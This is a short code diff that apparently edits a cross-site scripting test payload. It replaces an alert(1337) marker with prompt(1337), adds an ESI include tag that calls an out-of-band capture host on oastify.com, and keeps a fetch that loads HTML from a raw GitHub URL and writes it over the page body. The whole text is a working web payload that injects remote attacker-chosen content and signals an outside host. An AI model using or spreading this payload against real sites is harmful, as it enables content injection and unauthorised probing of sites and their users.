@@ -1,4 +1,5 @@
-alert(1337);//
+prompt(1337);//
+<esi:include src="http://xss.egynhlmt7zjzfb0t2vnciu24dvjm7b.oastify.com/capture" />
 fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/test.html").then(res=>res.text()).then(res => {
   document.body.innerHTML = res;
 
